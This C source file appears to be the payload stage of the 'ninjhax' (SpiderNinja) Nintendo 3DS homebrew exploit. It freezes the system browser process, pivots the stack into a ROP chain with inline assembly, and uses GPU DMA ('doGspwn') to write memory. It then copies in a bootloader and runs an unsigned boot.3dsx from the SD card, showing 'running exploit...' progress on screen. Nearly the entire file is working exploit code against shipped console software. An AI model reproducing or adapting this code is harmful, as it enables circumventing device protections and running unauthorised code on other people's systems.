#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/FS.h>
#include "text.h"
#include "../../../spider_thread0_rop/spider_thread0_rop_bin.h"
#include "../../../cn_bootloader/cn_bootloader_bin.h"

#include "../../../build/constants.h"

#define TOPFBTEMP ((u8*)SN_TOPFBTEMP)
#define SCREEN_TOP_LEFT_1 ((u8*)0x1F1E6000)
#define SCREEN_TOP_LEFT_2 ((u8*)0x1F22C800)

const int dead_data[] = {0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0x0012365C, 0};

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _strappend(char* str1, char* str2)
{
	_strcpy(&str1[_strlen(str1)], str2);
}

const u8 hexTable[]=
{
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

void hex2str(char* out, u32 val)
{
	int i;
	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
	out[8]=0x00;
}

void doGspwn(u8* src, u8* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)SN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(SN_GSPSHAREDBUF_ADR);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

void renderString(char* str, int x, int y)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
	drawString(TOPFBTEMP,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
}

void centerString(char* str, int y)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
	int x=200-(_strlen(str)*4);
	drawString(TOPFBTEMP,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
}

void drawHex(u32 val, int x, int y)
{
	char str[9];

	hex2str(str,val);
	renderString(str,x,y);
}

Result _GSPGPU_AcquireRight(Handle handle, u8 flags)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x160042; //request header code
	cmdbuf[1]=flags;
	cmdbuf[2]=0x0;
	cmdbuf[3]=0xffff8001;

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_FlushInvalidateCache(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00010042; //request header code
	cmdbuf[1]=0x00100000;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_SetupBootloader(Handle handle, u32 addr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00020042; //request header code
	cmdbuf[1]=addr;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_GetHandle(Handle handle, u32 index, Handle* out)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00040040; //request header code
	cmdbuf[1]=index;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(out)*out=cmdbuf[5];

	return cmdbuf[1];
}

Result _RO_Shutdown(Handle handle, u32 processid, u32 crs_buffer)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x80042; //request header code
	cmdbuf[1]=crs_buffer;
	cmdbuf[2]=0;
	cmdbuf[3]=processid;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

void clearScreen(u8 shade)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)SN_GSPGPU_FlushDataCache_ADR;
	memset(TOPFBTEMP, 0, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBTEMP, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_1, 240*400*3);
	doGspwn(TOPFBTEMP, SCREEN_TOP_LEFT_2, 240*400*3);
}

void errorScreen(char* str, u32* dv, u8 n)
{
	clearScreen(0x00);
	renderString("FATAL ERROR",0,0);
	renderString(str,0,10);
	if(dv && n)
	{
		int i;
		for(i=0;i<n;i++)drawHex(dv[i], 8, 50+i*10);
	}
	while(1);
}

void drawTitleScreen(char* str)
{
	clearScreen(0x00);
	centerString("NINJHAX v1.1b",0);
	centerString(BUILDTIME,10);
	centerString("http://smealum.net/ninjhax/",20);
#if BUILD_SPIDERNINJA
	centerString("SpiderNinja",30);
	centerString("http://yifan.lu/p/spiderninja",40);
	renderString(str, 0, 60);
#else
	renderString(str, 0, 40);
#endif
}

int main_initial(void)
{
	Handle rohandle;
	// freeze spider
	*(const int **)SN_FREEZE_APP = dead_data;
    svc_sleepThread(0x400000LL);
    svc_sleepThread(0x400000LL);
    svc_sleepThread(0x400000LL);
	drawTitleScreen("");
	drawTitleScreen("running exploit... 000%");
	// clean up loaded cro
	rohandle = *(Handle*)SN_ROHANDLE_ADR;
	_RO_Shutdown(rohandle, 0xFFFF8001, *(u32*)SN_CRS_MAP_ADR);
	drawTitleScreen("running exploit... 010%");
	// load next stage (ROP to rohax)
	memcpy((u8*)SPIDER_THREAD0ROP_VADR, spider_thread0_rop_bin, spider_thread0_rop_bin_len);
	drawTitleScreen("running exploit... 020%");
	asm volatile ("mov sp, %0\t\n"
				  "pop {r0, pc}\t\n" :: "r" (SPIDER_THREAD0ROP_VADR) : "sp", "memory");
	while (1);
	return 0;
}

int main_secondary(Handle hbHandle)
{
	Handle* gspHandle=(Handle*)SPIDER_GSPHANDLE_ADR;

	Result ret;

	_GSPGPU_AcquireRight(*gspHandle, 0x0); //get in line for gsp rights

	drawTitleScreen("running exploit... 050%");
	_HB_FlushInvalidateCache(hbHandle);
	Handle fsHandle;
	ret=_HB_GetHandle(hbHandle, 0x0, &fsHandle);

	// //allocate some memory for the bootloader code (will be remapped)
	// u32 out; ret=svc_controlMemory(&out, 0x13FF0000, 0x00000000, 0x00008000, MEMOP_COMMIT, 0x3);
	//allocate some memory for homebrew .text/rodata/data/bss... (will be remapped)
	u32 out; ret=svc_controlMemory(&out, SN_ALLOCPAGES_ADR, 0x00000000, CN_ADDPAGES*0x1000, MEMOP_COMMIT, 0x3);

	drawTitleScreen("running exploit... 060%");

	if(_HB_SetupBootloader(hbHandle, SN_ALLOCPAGES_ADR))*((u32*)NULL)=0xBABE0061;

	drawTitleScreen("running exploit... 070%");

	// cleanup
	if (0)
	{
		// cleanup by forcing all threads to close
		unsigned int addr = 0x00100000;
		for (addr = 0x00100000; addr < 0x00100000+SPIDER_TEXT_LENGTH; addr += 12)
		{
			unsigned int instr = *(unsigned int *)addr;
			if ((instr & 0xE0000000) == 0xE0000000)
			{
				*((unsigned int *)addr + 0) = 0xe3e00000;
				*((unsigned int *)addr + 1) = 0xe3e01000;
				*((unsigned int *)addr + 2) = 0xef00000a;
			}
		}

		s32 out;
		// wake thread1
		svc_releaseSemaphore(&out, *(Handle*)SPIDER_PROCSEMAPHORE_ADR, 1);
		// wake thread2
		svc_signalEvent(*(Handle*)(SPIDER_APTHANDLES_ADR+8));
		// wake thread3 and thread4
		svc_arbitrateAddress(*(Handle*)SPIDER_ADDRESSARBITER_ADR, SPIDER_ARBADDRESS_1, 0, -1, 0LL);
		// wake thread7
		svc_arbitrateAddress(*(Handle*)SPIDER_ADDRESSARBITER_ADR, SPIDER_ARBADDRESS_2, 0, -1, 0LL);
		// wake thread8
		svc_arbitrateAddress(*(Handle*)SPIDER_ADDRESSARBITER_ADR, SPIDER_ARBADDRESS_3, 0, -1, 0LL);
		// wake thread10
		svc_arbitrateAddress(*(Handle*)SPIDER_ADDRESSARBITER_ADR, SPIDER_ARBADDRESS_4, 0, -1, 0LL);
		// sleep for a second
		svc_sleepThread(0x3b9aca00LL);
		drawTitleScreen("running exploit... 075%");

		//unmap GSP and HID shared mem
		svc_unmapMemoryBlock(*((Handle*)SPIDER_HIDMEMHANDLE_ADR), 0x10000000);
		svc_unmapMemoryBlock(*((Handle*)SPIDER_GSPMEMHANDLE_ADR), 0x10002000);
		//close all handles in data and .bss sections
		int i;
		for(i=0;i<(SN_DATABSS_SIZE)/4;i++)
		{
			Handle val=((Handle*)(SN_DATABSS_START))[i];
			if(val && (val&0x7FFF)<0x30 && val!=*gspHandle && val!=hbHandle)svc_closeHandle(val);
		}
		// close handles in the heap
		svc_closeHandle(*(Handle*)SN_FREE_HANDLE_1);
		svc_closeHandle(*(Handle*)SN_FREE_HANDLE_2);
		svc_closeHandle(*(Handle*)SN_FREE_HANDLE_3);

		drawTitleScreen("running exploit... 080%");

		//free GSP heap and regular heap
		//svc_controlMemory(&out, SPIDER_GSPHEAPSTART, 0x00000000, SPIDER_GSPHEAPSIZE, MEMOP_FREE, 0x0);
	}

	drawTitleScreen("running exploit... 090%");
	
	memcpy((u8*)CN_BOOTLOADER_LOC, cn_bootloader_bin, cn_bootloader_bin_len);
	
	drawTitleScreen("running exploit... 095%");

	_HB_FlushInvalidateCache(hbHandle);

	drawTitleScreen("running exploit... 100%");

	//open sdmc 3dsx file
	Handle fileHandle;
	FS_archive sdmcArchive=(FS_archive){0x9, (FS_path){PATH_EMPTY, 1, (u8*)""}};
	const FS_path filePath=(const FS_path){PATH_CHAR, 11, (u8*)"/boot.3dsx"};
	if((ret=FSUSER_OpenFileDirectly(fsHandle, &fileHandle, sdmcArchive, filePath, FS_OPEN_READ, FS_ATTRIBUTE_NONE))!=0)
	{
		errorScreen("   failed to open sd:/boot.3dsx.\n    does it exist ?", (u32*)&ret, 1);
	}
	
	svc_controlMemory(&out, 0x14000000, 0x00000000, 0x02000000, MEMOP_FREE, 0x0);

	void (*callBootloader)(Handle hb, Handle file)=(void*)CN_BOOTLOADER_LOC;
	void (*setArgs)(u32* src, u32 length)=(void*)CN_ARGSETTER_LOC;
	_GSPGPU_ReleaseRight(*gspHandle); //disable GSP module access
	svc_closeHandle(*gspHandle);

	setArgs(NULL, 0);

	drawTitleScreen("Loading boot.3dsx...");
	// TODO: Free temp fb heap
	callBootloader(hbHandle, fileHandle);

	while(1);
	return 0;
}

int main_start(u32 is_secondary, Handle hbHandle)
{
	if (is_secondary)
	{
		return main_secondary(hbHandle);
	}
	else
	{
		return main_initial();
	}
}

int main(int argc, const char *argv[])
{
	return main_start((u32)argc, (Handle)argv);
}
